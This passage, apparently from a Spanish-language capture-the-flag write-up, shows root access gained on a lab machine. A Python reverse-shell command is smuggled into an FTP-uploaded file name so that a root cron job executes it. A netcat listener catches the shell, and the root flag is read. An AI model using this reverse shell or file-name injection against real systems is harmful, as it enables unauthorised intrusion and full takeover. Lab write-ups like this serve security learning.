Si recordamos hay una tarea cron podemos inyectar la reverse shell en **Python** pero con la extension **.cvs** y ganar acceso ala maquina como root ya que root ejecuta el script de la tarea cron

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Lo inyectamos

```bash
ftp> put "|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("\"10.10.14.116\"",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("\"sh\"")';.csv"
local: |python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.116",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';.csv remote: |python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.116",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';.csv
421 Timeout.
```

Tenemos shell

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.116] from (UNKNOWN) [10.10.10.249] 44182
# whoami
whoami
root
# ls
ls
'|python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("10.10.14.116",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'\'';.csv'
# ls -la
ls -la
total 16
drwx-wx---   2 root ftp  4096 Dec 23 00:28  .
drwxr-xr-x 176 root ftp 12288 May 20  2021  ..
-rw-------   1 ftp  ftp     0 Dec 23 00:28 '|python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("10.10.14.116",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'\'';.csv'
# pwd
pwd
/srv/ftp/versions
# cd /home
cd /home
# ls
ls
pwnmeow
# cd /root
cd /root
# ls    	
ls
root.txt  vsftpd.log
# cat root.txt  
cat root.txt
459cd18bc7fd839a028890d95ca968ab
# 
# id
id
uid=0(root) gid=0(root) groups=0(root)
# hostname -I
hostname -I
10.10.10.249 dead:beef::250:56ff:feb9:e36b 
# 
```
